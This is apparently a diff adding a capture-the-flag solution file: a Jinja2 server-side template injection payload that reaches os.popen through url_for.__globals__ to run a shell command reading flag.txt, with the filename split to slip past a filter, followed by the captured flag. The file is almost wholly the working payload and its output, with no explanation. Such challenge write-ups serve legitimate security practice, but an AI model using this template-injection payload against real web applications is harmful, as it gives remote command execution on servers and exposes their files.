@@ -1,0 +1,11 @@
+Payload:
+1
+1
+{{url_for.__globals__
+os.popen("cat flag.tx
+"[:11]+"t").read()}}
+
+
+
+Flag:
+DO{an0th3r_ssti_ch4ll3nge_l0l593deff6}
